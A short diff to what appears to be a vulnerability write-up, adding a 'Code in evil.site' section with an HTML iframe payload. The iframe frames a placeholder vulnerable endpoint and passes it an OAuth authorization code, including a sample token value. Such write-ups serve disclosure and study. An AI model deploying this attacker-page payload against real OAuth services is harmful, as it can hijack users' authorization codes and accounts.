@@ -15,3 +15,6 @@
 ![image](https://user-images.githubusercontent.com/108616378/219943230-41cfea35-22be-40e3-9af5-32240afaa35c.png)
 
 ### Code in evil.site:
+```html
+<iframe src="<Vulnerable-endpoit>?code=<Token-Send-By-OAUTH-Service-provider><i.e h0nZpg4jB32qod922qYplCs2yYXfA>"></iframe>
+```
